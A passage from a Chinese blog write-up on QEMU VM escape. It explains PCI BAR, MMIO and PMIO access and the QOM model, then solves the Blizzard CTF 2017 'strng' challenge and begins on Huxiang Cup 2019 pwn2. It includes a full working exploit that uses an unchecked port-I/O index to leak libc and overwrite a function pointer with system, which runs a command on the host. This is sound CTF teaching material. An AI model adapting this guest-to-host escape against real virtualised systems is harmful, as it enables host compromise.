---
title: qemu逃逸初探
categories:
- qemu escape
---
# qemu逃逸初探

## 前言

今天是19年的最后一天，本来想发点总结的，合计了一下发现没什么能说的，还是算了，做一下很久之前就想做的题。基本是复现ray-cp师傅的做题过程，中间还有些疑惑的地方。

## 基础知识

### 地址转换

大概看了三道题，题目都是自己写个设备，和qemu共同编译，之后指定这个设备作为device。通过设备的读写漏洞进行逃逸。  
首先是qemu相关的内存映射，我们的虚拟机分配一块内存(在启动qemu的脚本中指定)给qemu进程，这块地址是我们虚拟机的虚拟地址，却是qemu作为一个模拟系统中的物理地址，这个地址再通过地址映射的方式分配给其中的进程使用。图如下所示(抄自ray-cp师傅)

```
Guest' processes
                     +--------------------+
Virtual addr space   |                    |
                     +--------------------+
                     |                    |
                     \__   Page Table     \__
                        \                    \
                         |                    |  Guest kernel
                    +----+--------------------+----------------+
Guest's phy. memory |    |                    |                |
                    +----+--------------------+----------------+
                    |                                          |
                    \__                                        \__
                       \                                          \
                        |             QEMU process                 |
                   +----+------------------------------------------+
Virtual addr space |    |                                          |
                   +----+------------------------------------------+
                   |                                               |
                    \__                Page Table                   \__
                       \                                               \
                        |                                               |
                   +----+-----------------------------------------------++
Physical memory    |    |                                               ||
                   +----+-----------------------------------------------++
```

如果我们在qemu虚拟机里申请一段地址空间mem，则可以先用qemu里的地址映射计算出其在qemu物理内存地址(在qemu内部查看二进制程序的map基址加上申请地址的偏移)，进而将这个地址作为偏移加上在VMWare内查看map得到的qemu进程基址算出mem在虚拟机的实际地址。  


### pci设备空间

pci设备有一个配置空间记录设备的详细信息。大小为256字节，前64字节是PCI标准规定的。前16个字节的格式是固定的，包含头部的类型、设备种类、设备的性质以及制造商等，格式如下：

![pci config space](./1.png)

比较关键的是其6个BAR(Base Address Registers)，BAR记录了设备所需要的地址空间的类型，基址以及其他属性。BAR的格式如下：

![bar](./2.png)

设备可以申请两类地址空间，memory space和I/O space，用BAR的最后一位区别开。  
当BAR最后一位为0表示这是映射的I/O内存，为1是表示这是I/O端口，当是I/O内存的时候1-2位表示内存的类型，bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预取。  
而相对于I/O内存，当最后一位为1时表示映射的I/O端口。I/O端口一般不支持预取，所以这里是29位的地址。  
通过memory space访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。  
通过I/O space访问设备I/O的方式称为port I/O，或者port mapped I/O，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。  
在MMIO中，内存和I/O设备共享同一个地址空间。 MMIO是应用得最为广泛的一种I/O方法，它使用相同的地址总线来处理内存和I/O设备，I/O设备的内存和寄存器被映射到与之相关联的地址。当CPU访问某个内存地址时，它可能是物理内存，也可以是某个I/O设备的内存，用于访问内存的CPU指令也可来访问I/O设备。每个I/O设备监视CPU的地址总线，一旦CPU访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳I/O设备，CPU必须预留给I/O一个地址区域，该地址区域不能给物理内存使用。

在PMIO中，内存和I/O设备有各自的地址空间。 端口映射I/O通常使用一种特殊的CPU指令，专门执行I/O操作。在Intel的微处理器中，使用的指令是IN和OUT。这些指令可以读/写1,2,4个字节（例如：outb, outw, outl）到IO设备上。I/O设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在CPU物理接口上增加一个I/O引脚，要么增加一条专用的I/O总线。由于I/O地址空间与内存地址空间是隔离的，所以有时将PMIO称为被隔离的IO(Isolated I/O)。

### 查看pci设备

lspci命令用于显示当前主机的所有PCI总线信息，以及所有已连接的PCI设备信息。

pci设备的寻址是由总线、设备以及功能构成。如下所示：
```
ubuntu@ubuntu:~$ lspci
00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)
00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]
00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]
00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)
00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03)
```
xx:yy:z的格式为总线:设备:功能的格式。

PCI 设备通过VendorIDs、DeviceIDs、以及Class Codes字段区分：

```
ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0
Device: 00:03.0
Class:  00ff
Vendor: 1234
Device: 11e9
SVendor:        1af4
SDevice:        1100
PhySlot:        3
Rev:    10
```

查看设备的内存空间：

```
ubuntu@ubuntu:~$ lspci -v -s 00:03.0 -x
00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)
        Subsystem: Red Hat, Inc Device 1100
        Physical Slot: 3
        Flags: fast devsel
        Memory at febf1000 (32-bit, non-prefetchable) [size=256]
        I/O ports at c050 [size=8]
00: 34 12 e9 11 03 01 00 00 10 00 ff 00 00 00 00 00
10: 00 10 bf fe 51 c0 00 00 00 00 00 00 00 00 00 00
20: 00 00 00 00 00 00 00 00 00 00 00 00 f4 1a 00 11
30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
```

可以看到该设备有两个空间：BAR0为MMIO空间，地址为febf1000，大小为256；BAR1为PMIO空间，端口地址为0xc050，大小为8。

我们还可以通过resource文件来查看内存空间

```
ubuntu@ubuntu:~$ ls -la /sys/devices/pci0000\:00/0000\:00\:03.0/
total 0
drwxr-xr-x  3 root root    0 Dec 31 11:13 .
drwxr-xr-x 11 root root    0 Dec 31 11:13 ..
-rw-r--r--  1 root root 4096 Dec 31 15:29 broken_parity_status
-r--r--r--  1 root root 4096 Dec 31 15:29 class
-rw-r--r--  1 root root  256 Dec 31 15:29 config
-r--r--r--  1 root root 4096 Dec 31 15:29 consistent_dma_mask_bits
-rw-r--r--  1 root root 4096 Dec 31 15:29 d3cold_allowed
-r--r--r--  1 root root 4096 Dec 31 15:29 device
-r--r--r--  1 root root 4096 Dec 31 15:29 dma_mask_bits
-rw-r--r--  1 root root 4096 Dec 31 15:29 enable
lrwxrwxrwx  1 root root    0 Dec 31 15:29 firmware_node -> ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06
-r--r--r--  1 root root 4096 Dec 31 11:13 irq
-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpulist
-r--r--r--  1 root root 4096 Dec 31 15:29 local_cpus
-r--r--r--  1 root root 4096 Dec 31 15:29 modalias
-rw-r--r--  1 root root 4096 Dec 31 15:29 msi_bus
drwxr-xr-x  2 root root    0 Dec 31 15:29 power
--w--w----  1 root root 4096 Dec 31 15:29 remove
--w--w----  1 root root 4096 Dec 31 15:29 rescan
-r--r--r--  1 root root 4096 Dec 31 15:29 resource
-rw-------  1 root root  256 Dec 31 11:18 resource0
-rw-------  1 root root    8 Dec 31 15:29 resource1
lrwxrwxrwx  1 root root    0 Dec 31 15:29 subsystem -> ../../../bus/pci
-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_device
-r--r--r--  1 root root 4096 Dec 31 15:29 subsystem_vendor
-rw-r--r--  1 root root 4096 Dec 31 11:13 uevent
-r--r--r--  1 root root 4096 Dec 31 15:29 vendor

```

`resoucre`文件包含其它相应空间的数据，如resource0（MMIO空间）以及resource1（PMIO空间）

每行代表起始地址、结束地址以及标志位

```
ubuntu@ubuntu:~$ cat /sys/devices/pci0000\:00/0000\:00\:03.0/resource
0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
0x000000000000c050 0x000000000000c057 0x0000000000040101
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
0x0000000000000000 0x0000000000000000 0x0000000000000000
```

### qemu访问I/O空间

#### 访问mmio

编写内核模块，可以在内核态访问mmio空间，demo如下：

```c
#include <asm/io.h>
#include <linux/ioport.h>

long addr=ioremap(ioaddr,iomemsize);
readb(addr);
readw(addr);
readl(addr);
readq(addr);

writeb(val,addr);
writew(val,addr);
writel(val,addr);
writeq(val,addr);
iounmap(addr);
```

用户态访问主要是通过映射resource0文件实现访问，给定地址可以直接赋值或者取值。

```c
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <unistd.h>
#include<sys/io.h>


unsigned char* mmio_mem;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}



void mmio_write(uint32_t addr, uint32_t value)
{
    *((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem + addr));
}




int main(int argc, char *argv[])
{

    // Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);

    mmio_read(0x128);
        mmio_write(0x128, 1337);

}
```

#### 访问pmio

内核态访问使用in*/out*函数访问某个端口

```c
#include <asm/io.h> 
#include <linux/ioport.h>

inb(port);  //读取一字节
inw(port);  //读取两字节
inl(port);  //读取四字节

outb(val,port); //写一字节
outw(val,port); //写两字节
outl(val,port); //写四字节
```

用户态访问要先调用`iopl`申请访问大于0x3ff的端口

```c
#include <sys/io.h >

iopl(3); 
inb(port); 
inw(port); 
inl(port);

outb(val,port); 
outw(val,port); 
outl(val,port);
```

### QOM编程模型

QEMU提供了一套面向对象编程的模型——QOM（QEMU Object Module），几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。

有几个结构体比较关键，`TypeInfo`、`TypeImpl`、`ObjectClass`以及`Object`。

`TypeInfo`是用户用来定义一个Type的数据结构，用户定义一个`TypeInfo`，然后调用`type_register(TypeInfo)`或者`type_register_static(TypeInfo)`函数，就会生成相应的TypeImpl实例，将这个`TypeInfo`注册到全局的`TypeImpl`的`hash`表中。

`TypeImpl`的属性与TypeInfo的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl对象。如下面定义的`pci_test_dev`。

```c
static const TypeInfo pci_testdev_info = {
        .name          = TYPE_PCI_TEST_DEV,
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(PCITestDevState),
        .class_init    = pci_testdev_class_init,
};
TypeImpl *type_register_static(const TypeInfo *info)
{
    return type_register(info);
}
TypeImpl *type_register(const TypeInfo *info)
{
    assert(info->parent);
    return type_register_internal(info);
}
static TypeImpl *type_register_internal(const TypeInfo *info)
{
    TypeImpl *ti;
    ti = type_new(info);
    type_table_add(ti);
    return ti;
}
```

当所有qemu总线、设备等的`type_register_static`执行完成后，即它们的`TypeImpl`实例创建成功后，qemu就会在`type_initialize`函数中实例化其对应的`ObjectClass`。

每个`type`都有一个相应的ObjectClass对应，它是所有类的基类。

```c
struct ObjectClass
{
    /*< private >*/
    Type type;  
    GSList *interfaces;
    const char *object_cast_cache[OBJECT_CLASS_CAST_CACHE];
    const char *class_cast_cache[OBJECT_CLASS_CAST_CACHE];
    ObjectUnparent *unparent;
    GHashTable *properties;
};
```

用户可以定义自己的类，继承相应类即可。

```c
/* include/qom/object.h */
typedef struct TypeImpl *Type;
typedef struct ObjectClass ObjectClass;
struct ObjectClass
{
        /*< private >*/
        Type type;       /* points to the current Type's instance */
        ...
/* include/hw/qdev-core.h */
typedef struct DeviceClass {
        /*< private >*/
        ObjectClass parent_class;
        /*< public >*/
        ...
/* include/hw/pci/pci.h */
typedef struct PCIDeviceClass {
        DeviceClass parent_class;
        ...
```

可以看到类的定义中父类都在第一个字段，使得可以父类与子类直接实现转换。一个类初始化时会先初始化它的父类，父类初始化完成后，会将相应的字段拷贝至子类同时将子类其余字段赋值为0，再进一步赋值。同时也会继承父类相应的虚函数指针，当所有的父类都初始化结束后，`TypeInfo::class_init`会调用以实现虚函数的初始化，如下面的`pci_testdev_class_init`:

```c
static void pci_testdev_class_init(ObjectClass *klass, void *data)
{
        DeviceClass *dc = DEVICE_CLASS(klass);
        PCIDeviceClass *k = PCI_DEVICE_CLASS(klass);
        k->init = pci_testdev_init;
        k->exit = pci_testdev_uninit;
        ...
        dc->desc = "PCI Test Device";
        ...
}
```

最后是`Object`对象

```c
struct Object
{
    /*< private >*/
    ObjectClass *class;
    ObjectFree *free;
    GHashTable *properties;
    uint32_t ref;
    Object *parent;
};
```

之前提到的`Type`以及`ObjectClass`只是一个类型，而不是具体的设备。`TypeInfo`结构体中有两个函数指针：`instance_init`以及`class_init`。`class_init`负责初始化`ObjectClass`结构体，`instance_init`负责初始化具体`Object`结构体。

>the Object constructor and destructor functions (registered by the respective Objectclass constructors) will now only get called if the corresponding PCI device's -device option was specified on the QEMU command line (unless, probably, it is a default PCI device for the machine). 
Object类的构造函数与析构函数（在Objectclass构造函数中注册的）只有在命令中-device指定加载该设备后才会调用（或者它是该系统的默认加载PCI设备）。
`Object`示例如下：

```c
/* include/qom/object.h */
typedef struct Object Object;
struct Object
{
        /*< private >*/
        ObjectClass *class; /* points to the Type's ObjectClass instance */
        ...
/* include/qemu/typedefs.h */
typedef struct DeviceState DeviceState;
typedef struct PCIDevice PCIDevice;
/* include/hw/qdev-core.h */
struct DeviceState {
        /*< private >*/
        Object parent_obj;
        /*< public >*/
        ...
/* include/hw/pci/pci.h */
struct PCIDevice {
        DeviceState qdev;
        ...
struct YourDeviceState{
        PCIDevice pdev;
        ...
```
>（QOM will use instace_size as the size to allocate a Device Object, and then it invokes the instance_init ）

QOM会为设备`Object`分配`instance_size`大小的空间，然后调用`instance_init`函数（在`ObjectClass`的`class_init`函数中定义）：

```c
static int pci_testdev_init(PCIDevice *pci_dev)
{
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...
```

最后是PCI的内存空间，qemu使用MemoryRegion表示内存空间，使用`MemoryRegionOps`结构体来对内存的操作进行表示，如`PMIO`或`MMIO`。对每个`PMIO`或者`MMIO`操作都需要相应的`MemoryRegionOps`结构体，其中包含相应的`read/write`回调函数。

```c
static const MemoryRegionOps pci_testdev_mmio_ops = {
        .read = pci_testdev_read,
        .write = pci_testdev_mmio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = {
                .min_access_size = 1,
                .max_access_size = 1,
        },
};

static const MemoryRegionOps pci_testdev_pio_ops = {
        .read = pci_testdev_read,
        .write = pci_testdev_pio_write,
        .endianness = DEVICE_LITTLE_ENDIAN,
        .impl = {
                .min_access_size = 1,
                .max_access_size = 1,
        },
};
```

首先用`memory_region_init_io`函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用`pci_register_bar`来注册BAR等信息。需要指出的无论是MMIO还是PMIO，其对应的空间都需要显式的指出（即静态生命或动态分配），因为memory_region_init_io只是记录空间大小而并不分配。

```c
/* hw/misc/pci-testdev.c */
#define IOTEST_IOSIZE 128
#define IOTEST_MEMSIZE 2048

typedef struct PCITestDevState {
        /*< private >*/
        PCIDevice parent_obj;
        /*< public >*/

        MemoryRegion mmio;
        MemoryRegion portio;
        IOTest *tests;
        int current;
} PCITestDevState;

static int pci_testdev_init(PCIDevice *pci_dev)
{
        PCITestDevState *d = PCI_TEST_DEV(pci_dev);
        ...
        memory_region_init_io(&d->mmio, OBJECT(d), &pci_testdev_mmio_ops, d,
                                                    "pci-testdev-mmio", IOTEST_MEMSIZE * 2); 
        memory_region_init_io(&d->portio, OBJECT(d), &pci_testdev_pio_ops, d,
                                                    "pci-testdev-portio", IOTEST_IOSIZE * 2); 
        pci_register_bar(pci_dev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &d->mmio);
        pci_register_bar(pci_dev, 1, PCI_BASE_ADDRESS_SPACE_IO, &d->portio);
```

## Blizzard CTF 2017 Strng

### 代码分析

最开始用type_init调用pci_strng_register_types初始化一个type_info，在结构体中要给出strng_init和class_init方法，之后调用type_register_static添加type

```c
type_init(pci_strng_register_types)
static void pci_strng_register_types(void)
{
    static const TypeInfo strng_info = {
        .name          = "strng",
        .parent        = TYPE_PCI_DEVICE,
        .instance_size = sizeof(STRNGState),
        .instance_init = strng_instance_init,
        .class_init    = strng_class_init,
    };

    type_register_static(&strng_info);
}
```

strng_class_init初始化一个ObjectClass，赋值`pci_strng_realize`;赋给设备一个vendor_id、device_id、class_id等唯一标识。

```c
static void strng_class_init(ObjectClass *class, void *data)
{
    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);

    k->realize = pci_strng_realize;
    k->vendor_id = PCI_VENDOR_ID_QEMU;
    k->device_id = 0x11e9;
    k->revision = 0x10;
    k->class_id = PCI_CLASS_OTHERS;
}
```

strng_instance_init初始化一个Object实例，给函数指针赋值。

```c
static void strng_instance_init(Object *obj)
{
    STRNGState *strng = STRNG(obj);

    strng->srand = srand;
    strng->rand = rand;
    strng->rand_r = rand_r;
}
```

pci_strng_realize首先用`memory_region_init_io`函数初始化内存空间(MemoryRegion结构体)，记录空间大小，注册相应的读写函数等；然后调用`pci_register_bar`来注册BAR等信息。

```c
static void pci_strng_realize(PCIDevice *pdev, Error **errp)
{
    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);

    memory_region_init_io(&strng->mmio, OBJECT(strng), &strng_mmio_ops, strng, "strng-mmio", STRNG_MMIO_SIZE);
    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &strng->mmio);
    memory_region_init_io(&strng->pmio, OBJECT(strng), &strng_pmio_ops, strng, "strng-pmio", STRNG_PMIO_SIZE);
    pci_register_bar(pdev, 1, PCI_BASE_ADDRESS_SPACE_IO, &strng->pmio);
}
```

`strng_mmio_ops`和`strng_pmio_ops`给了读写mmio和pmio的函数

```c
static const MemoryRegionOps strng_mmio_ops = {
    .read = strng_mmio_read,
    .write = strng_mmio_write,
    .endianness = DEVICE_NATIVE_ENDIAN,
};
static const MemoryRegionOps strng_pmio_ops = {
    .read = strng_pmio_read,
    .write = strng_pmio_write,
    .endianness = DEVICE_LITTLE_ENDIAN,
};
```

最后看下设备的结构体，后面跟了三个函数指针。

```c
typedef struct {
    PCIDevice pdev;
    MemoryRegion mmio;
    MemoryRegion pmio;
    uint32_t addr;
    uint32_t regs[STRNG_MMIO_REGS];
    void (*srand)(unsigned int seed);
    int (*rand)(void);
    int (*rand_r)(unsigned int *seed);
} STRNGState;
```

先来看下mmio的读写操作(反编译之后记得将opaque结构体转成STRNGState *类型方便查看).

mmio_read:如果`addr`是`4`的倍数，就返回`regs[addr>>2]`，其他情况返回-1。

mmio_write:如果`addr`是`4`的倍数，取`i`为`addr>>2`。
1. 如果`i`为`1`,调用里面的`rand`函数，参数为`(opaque,i,val)`，结果存储在`regs[1]`里。
2. 如果`i`为`0`,调用里面的`srand`函数，参数为`val`
3. 如果`i`为`3`,调用里面的`rand_r`函数，参数为`&regs[2]`，`regs[3]`存储函数返回值，`regs[i]`存储`val`
4. 其他情况直接把`val`赋值给`regs[i]`

```c
uint64_t __fastcall strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  result = -1LL;
  if ( size == 4 && !(addr & 3) )
    result = opaque->regs[addr >> 2];
  return result;
}

// local variable allocation has failed, the output may be wrong!
void __fastcall strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  hwaddr v4; // rsi
  int v5; // ST08_4
  uint32_t v6; // eax

  if ( size == 4 && !(addr & 3) )
  {
    v4 = addr >> 2;
    if ( (_DWORD)v4 == 1 )
    {
      opaque->regs[1] = ((__int64 (__fastcall *)(STRNGState *, hwaddr, uint64_t))opaque->rand)(opaque, v4, val);
    }
    else if ( (unsigned int)v4 < 1 )
    {
      ((void (__fastcall *)(_QWORD))opaque->srand)((unsigned int)val);
    }
    else
    {
      if ( (_DWORD)v4 == 3 )
      {
        v5 = val;
        v6 = ((__int64 (__fastcall *)(uint32_t *))opaque->rand_r)(&opaque->regs[2]);
        LODWORD(val) = v5;
        opaque->regs[3] = v6;
      }
      opaque->regs[(unsigned int)v4] = val;
    }
  }
}
```

再来看下pmio相关的读写操作。

pmio_read:如果addr是`4`的倍数，`idx取opaque的成员addr`，如果`idx`是`4`的倍数，直接返回`regs[idx>>2]`，否则返回`opaque->addr`

pmio_write:
1. 如果addr为`0`，直接将`opaque->addr`赋值为`val`
2. 如果addr为`4`的倍数，`idx取opaque的成员addr`。`v5`取`idx>>2`，如果`v5`为`1`，调用`rand(opaque,4,val)`，结果存放在`regs[1]`;如果`v5`为`0`，调用`srand(val)`;如果`v5`为`3`，调用`rand_r(&reg[2],4,val)`;否则将`val`赋值给`regs[v5]`

通过函数分析可以看到这里对于idx没有检查，我们可以用`pmio_write(0,offset)`设置`opaque->addr`为`offset`，之后用`pmio_read(offset)`读取`offset>>2`的值实现任意读;或者先用`pmio_write(0,offset)`设置`opaque->addr`为`offset`，再调用`pmio_write(4,val)`实现`regs[offset>>2] = val`的任意写。
```c
uint64_t __fastcall strng_pmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax
  uint32_t idx; // edx

  result = -1LL;
  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        idx = opaque->addr;
        if ( !(idx & 3) )
          result = opaque->regs[idx >> 2];
      }
    }
    else
    {
      result = opaque->addr;
    }
  }
  return result;
}

void __fastcall strng_pmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  uint32_t idx; // eax
  __int64 v5; // rax

  if ( size == 4 )
  {
    if ( addr )
    {
      if ( addr == 4 )
      {
        idx = opaque->addr;
        if ( !(idx & 3) )
        {
          v5 = idx >> 2;
          if ( (_DWORD)v5 == 1 )
          {
            opaque->regs[1] = ((__int64 (__fastcall *)(STRNGState *, signed __int64, uint64_t))opaque->rand)(
                                opaque,
                                4LL,
                                val);
          }
          else if ( (unsigned int)v5 < 1 )
          {
            ((void (__fastcall *)(_QWORD))opaque->srand)((unsigned int)val);
          }
          else if ( (_DWORD)v5 == 3 )
          {
            opaque->regs[3] = ((__int64 (__fastcall *)(uint32_t *, signed __int64, uint64_t))opaque->rand_r)(
                                &opaque->regs[2],
                                4LL,
                                val);
          }
          else
          {
            opaque->regs[v5] = val;
          }
        }
      }
    }
    else
    {
      opaque->addr = val;
    }
  }
}

```

### 漏洞利用

根据上面实现的任意地址读写，我们可以用任意读泄露结构体后面的函数指针，因为这是在`qemu的进程空间`，所以可以把它想象成VMware虚拟机里的一道普通glibc pwn，泄露的地址就是这个Bin(qemu)的函数libc地址，进而算出`libc_base`。

getshell我们可以先往`regs[2]`写入`command`，之后覆写rand_r为system，调用mmio_write里分支为`3`的地方即可

### 调试

启动脚本的命令如下，做了端口映射，方便scp传输，传输文件可以用`scp -P5555 exp ubuntu@127.0.0.1:/home/ubuntu`
```bash
./qemu-system-x86_64 \
        -m 1G \
        -device strng \
        -hda my-disk.img \
        -hdb my-seed.img \
        -nographic \
        -L pc-bios/ \
        -enable-kvm \
        -device e1000,netdev=net0 \
        -netdev user,id=net0,hostfwd=tcp::5555-:22 \
```

调试卡了一会，环境为`ubuntu 16.04`，`gdb`版本`7.1`出错，编译了`gdb8`，在VMware查看进程号`ps -aux | grep qemu`，attach上去`sudo /usr/local/gdb/bin/gdb attach -q [pid]`即可，断点下在各个读写函数上
```sh
b *strng_pmio_write
b *strng_pmio_read
b *strng_mmio_write
b *strng_pmio_read
```

使用`print *(STRNGState*)($rdi)`输出结构体(是利用完之后停的所有后面是system)

![strng](./3.png)

结构体存放在堆上，后面还有堆地址，可以泄露libc和heap地址。

![heap](./4.png)

这里有个神奇的地方，就是这个数组的空间是`65*4`而不是`64*4`，这个可以通过`srandom`地址减去`64*5`看到。因为`read/write`操作的都是`4字节`，所以我们泄露一个64位地址要用两次，最后部分写`rand_r`为`system`，在`regs[2]`布置好参数，调用mmio_write的`3`分支即可。(我的参数为`cat /home/wz/flag`)

编译命令：
```sh
gcc ./exp.c -m32 -static -o exp
```

### exp.c

偏移为`ubuntu 16.04`的`libc-2.23`中得到的。

```c
#include <sys/io.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <assert.h>
#include <fcntl.h>
#include <inttypes.h>
#include <sys/types.h>

unsigned char* mmio_mem;
uint32_t pmio_base=0xc050;

void die(const char* msg)
{
    perror(msg);
    exit(-1);
}

void mmio_write(uint32_t addr,uint32_t value)
{
    *((uint32_t *)(mmio_mem+addr)) = value;
}

uint32_t mmio_read(uint32_t addr)
{
    return *((uint32_t*)(mmio_mem+addr));
}

void pmio_write(uint32_t addr,uint32_t value)
{
    outl(value,addr);
}

uint32_t pmio_read(uint32_t addr)
{
    return (uint32_t)(inl(addr));
}

uint32_t pmio_abread(uint32_t offset)
{
    //return the value of (addr >> 2)
    pmio_write(pmio_base+0,offset);
    return pmio_read(pmio_base+4);
}

void pmio_abwrite(uint32_t offset,uint32_t value)
{
    pmio_write(pmio_base+0,offset);
    pmio_write(pmio_base+4,value);
}

int main()
{
// Open and map I/O memory for the strng device
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR | O_SYNC);
    if (mmio_fd == -1)
        die("mmio_fd open failed");

    mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
    if (mmio_mem == MAP_FAILED)
        die("mmap mmio_mem failed");

    printf("mmio_mem @ %p\n", mmio_mem);
    //pmio_abwrite(0x100,0x12345678);
    //write args

    mmio_write(12,0x6d6f682f);
    mmio_write(16,0x7a772f65);
    mmio_write(20,0x616c662f);
    mmio_write(24,0x67);
    mmio_write(8,0x20746163);
    //set priviledge
    if(iopl(3) != 0){
        die("IO permission denied!\n");
    }
    //leak libc
	uint64_t srandom_addr=pmio_abread(66<<2);
    srandom_addr=srandom_addr<<32;
    srandom_addr+=pmio_abread(65<<2);
    printf("[+]srandom addr: 0x%llx\n",srandom_addr);
    uint64_t libc_base = srandom_addr - 0x3a8d0;
    uint64_t system_addr = libc_base + 0x45390;
    printf("[+]libc base: 0x%llx\n",libc_base);
    //leak heap
    uint32_t heap_offset = (65+7*2+1) << 2;
    uint64_t heap_addr = pmio_abread(heap_offset);
    printf("[+]heap addr: 0x%llx\n",heap_addr);
    heap_addr = heap_addr << 32;
    heap_addr += pmio_abread((65+7*2+2) << 2);
    uint64_t heap_base = heap_addr - 615344;
    printf("[+]heap base: 0x%llx\n",heap_base);
    //get flag
    pmio_abwrite(0x114,system_addr & 0xffffffff);
    mmio_write(0xc,0);
    return 0;
}


```

## 湖湘杯2019 pwn2 

### 前言

这道题基本就是刚才那道题改编的，当时在去重庆玩的火车上学长告诉我他调了一遍发现很简单，先膜一下学长orz。

### 程序分析

`mmio_read`和`mmio_write`和之前相似，但是在结构体里不再有函数指针，新的结构体是下面这样的，最下面改成了一个QEMUTimer_0结构体，在read/write中调用的rand统统来自于`plt`，因此不能通过覆写函数指针的方式劫持控制流。

```c
/*
00000000 STRNGState      struc ; (sizeof=0xC30, align=0x10, copyof_1439)
00000000 pdev            PCIDevice_0 ?
000008F0 mmio            MemoryRegion_0 ?
000009F0 pmio            MemoryRegion_0 ?
00000AF0 addr            dd ?
00000AF4 flag            dd ?
00000AF8 regs            dd 64 dup(?)
00000BF8 strng_timer     QEMUTimer_0 ?
00000C28                 db ? ; undefined
00000C29                 db ? ; undefined
00000C2A                 db ? ; undefined
00000C2B                 db ? ; undefined
00000C2C                 db ? ; undefined
00000C2D                 db ? ; undefined
00000C2E                 db ? ; undefined
00000C2F                 db ? ; undefined
00000C30 STRNGState      ends
//
00000000 QEMUTimer_0     struc ; (sizeof=0x30, align=0x8, copyof_508)
00000000                                         ; XREF: IscsiTask/r
00000000                                         ; STRNGState/r
00000000 expire_time     dq ?
00000008 timer_list      dq ?                    ; offset
00000010 cb              dq ?                    ; offset
00000018 opaque          dq ?                    ; offset
00000020 next            dq ?                    ; offset
00000028 scale           dd ?
0000002C                 db ? ; undefined
0000002D                 db ? ; undefined
0000002E                 db ? ; undefined
0000002F                 db ? ; undefined
00000030 QEMUTimer_0     ends
*/
uint64_t __cdecl strng_mmio_read(STRNGState *opaque, hwaddr addr, unsigned int size)
{
  uint64_t result; // rax

  if ( size != 4 || addr & 3 )
    result = -1LL;
  else
    result = opaque->regs[addr >> 2];
  return result;
}

void __cdecl strng_mmio_write(STRNGState *opaque, hwaddr addr, uint64_t val, unsigned int size)
{
  unsigned int v4; // eax
  uint32_t vala; // [rsp+8h] [rbp-28h]
  uint32_t saddr; // [rsp+24h] [rbp-Ch]

  vala = val;
  if ( size == 4 && !(addr & 3) )
  {
    saddr = addr >> 2;
    v4 = addr >> 2;
    if ( v4 == 1 )
    {
      opaque->regs[1] = rand();
    }
    else if ( v4 < 1 )
    {
      srand(val);
    }
    else
    {
      if ( v4 == 3 )
        opaque->regs[saddr] = rand_r(&opaque->regs[2]);
      opaque->flag = 1;
      opaque->regs[saddr] = vala;
    }
  }
}
```

